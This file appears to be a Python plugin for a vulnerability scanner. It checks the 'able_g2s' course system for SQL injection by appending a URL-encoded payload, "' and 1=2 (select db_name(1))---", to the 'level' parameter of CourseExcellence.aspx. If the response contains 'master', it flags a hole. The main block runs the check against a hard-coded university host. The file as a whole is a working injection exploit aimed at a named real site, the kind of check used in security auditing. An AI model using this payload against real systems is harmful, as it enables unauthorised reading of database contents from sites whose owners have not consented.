#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'


def assign(service, arg):
    if service == "able_g2s":
        return True, arg


def audit(arg):
    payload = 'G2S/ShowSystem/CourseExcellence.aspx?page=1&level=%E5%9B%BD%E5%AE%B6%E7%BA%A7%27%20and%201=2%20(select%20db_name(1))---'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'master' in res:
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('able_g2s', 'http://cc.sbs.edu.cn/')[1])